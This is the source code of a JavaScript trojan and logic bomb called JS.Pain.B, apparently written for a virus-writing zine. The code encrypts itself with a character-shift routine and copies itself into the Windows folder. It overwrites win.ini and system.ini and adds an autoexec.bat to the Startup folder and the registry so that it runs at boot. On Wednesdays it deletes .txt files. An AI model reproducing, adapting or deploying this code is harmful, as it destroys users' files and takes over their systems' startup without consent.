/*JS.Pain.B
  Pain is a trojan/logic bomb originally intended but never released for Metaphase #3
  It has been completely rewritten and I wanted to show various ways to add to startup besides registry,
  and show another key not commonly used. I havent seen any simple encryption routine in js on the internet so I wrote one.
  This code is only for DoomRiderz #1.
  shouts to kefi, Metalkid, dref, and impurity, wherever you are in life my friends, take care!
*/
var decryptor=
"function decrypt(stringz)\r\n"+ 
"{\r\n"+
"var sChar=String.fromCharCode(34);\r\n"+     
"var code='';\r\n"+
    "for (i=0; i<stringz.length; i++)\r\n"+
     "{\r\n"+
		 "var shell=WScript.CreateObject(\"WScript.Shell\");\r\n"+
                 "var go=stringz.charAt(i);\r\n"+
                "if(go!=String.fromCharCode(47)) {\r\n"+
                 "var replacer=(String.fromCharCode(stringz.charCodeAt(i)-2));\r\n"+
                
                 "code+=go.replace(go,replacer);\r\n"+
                                "}\r\n"+
                 "else {\r\n"+
                        "code+=go;\r\n"+
                      "}\r\n"+
     "}\r\n"+
       "return(code);\r\n"+
"}\r\n"+
"var shell=WScript.CreateObject(\"WScript.Shell\");\r\n"+
"var fso=WScript.CreateObject(\"Scripting.FileSystemObject\");\r\n"+
"var opent=fso.OpenTextFile(WScript.ScriptFullName,1);\r\n"+
"var readt=opent.ReadAll();\r\n"+
"opent.Close();\r\n"+
"virus=readt.substr(WScript.ScriptFullName.length-2066,2066);\r\n"+
"var writet=fso.OpenTextFile(WScript.ScriptFullName,2);\r\n"+
"writet.Write(decrypt(virus));\r\n"+
"writet.Close();\r\n"+
"shell.Run(WScript.ScriptfullName);\r\n";
var shell=WScript.CreateObject("WScript.Shell");
var fso=WScript.CreateObject("Scripting.FileSystemObject");
var opent=fso.OpenTextFile(WScript.ScriptFullName,1);
var readt=opent.ReadAll();
opent.Close();
function encrypt(stringz) 
{
     var code="";
    for (i=0; i<stringz.length; i++)
     {
		 var shell=WScript.CreateObject("WScript.Shell");
                 var go=stringz.charAt(i);
                if(go!=String.fromCharCode(47)) { 
                 var replacer=(String.fromCharCode(stringz.charCodeAt(i)+2));
                
                 code+=go.replace(go,replacer);
                                }
                 else {
                        code+=go;
                      }
     }
       return(code);
}
var fso=WScript.CreateObject("Scripting.FileSystemObject");
var createt=fso.CreateTextFile("pain.js);
createt.close();
var got=fso.OpenTextFile("pain.js",2);
got.Write(decryptor);
got.Close();
var got=fso.OpenTextFile("pain.js",8);
got.Write(encrypt(readt));
got.Close();
fso.CopyFile("pain.js","c:\\Windows\\win.js");
var winini=fso.CreateTextFile("c:\\Windows\\win.ini");
winini.WriteLine("[Windows]");
winini.WriteLine("load c:\\Windows\\win.js");
winini.WriteLine("run c:\\windows\\win.js");
winini.WriteLine("NullPort=None");
fso.CopyFile("pain.js","c:\\windows\\sys.js");
var writesys=fso.CreateTextFile("c:\\windows\\system.ini")
writesys.WriteLine("[boot]")
writesys.WriteLine("shell=explorer.exe c:\\windows\\sys.js");
var currentDate=new Date()
var currentDay=currentDate.getDay()
if(currentDay==3) {
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var createt=fso.CreateTextFile("autoexec.bat");
createt.WriteLine("@echo off");
createt.WriteLine("if exist *.txt del *.txt");
createt.Close(); 
fso.CopyFile("autoexec.bat","C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\autoexec.bat");
var shell=WScript.CreateObject("WScript.Shell");
shell.RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler","autoexec.bat");
}